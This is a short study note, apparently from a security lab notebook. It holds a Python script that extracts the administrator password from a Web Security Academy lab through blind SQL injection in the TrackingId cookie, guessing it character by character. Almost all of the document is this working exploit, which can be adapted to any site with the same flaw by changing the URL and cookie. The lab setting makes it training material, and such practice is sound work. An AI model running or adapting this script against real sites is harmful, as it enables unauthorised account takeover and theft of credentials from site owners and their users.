# Script to retrieve password

\#This script is capable to retrieve a password if the website is vulnerable to blind sql injection

First is needed to enumerate the password length for administrator user.

Python code:

```
from pwn import *
import requests,signal,time,pdb,sys,string

#This script is capable to retrieve a password if the website is vulnerable to blind sql injection
# First is needed to enumerate the password length for administrator user.

def def_handler(sig, frame):
    print("*\n\n [!] Saliendo...\n")
    sys.exit()

#ctrl+c

signal.signal(signal.SIGINT, def_handler)

main_url = "https://0abd00aa04f92447800d5dc300290017.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:
            cookies = {
                'TrackingId': "nh7s95y0Ru5DE44s' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                'session': '4LUohKbEWGJ7OZsX1TXYEZ3as4asFz5x'
            }
            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies = cookies)
            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break
makeRequest()
```

<figure><img src="../../../.gitbook/assets/variables founded.png" alt=""><figcaption><p>Variables source</p></figcaption></figure>



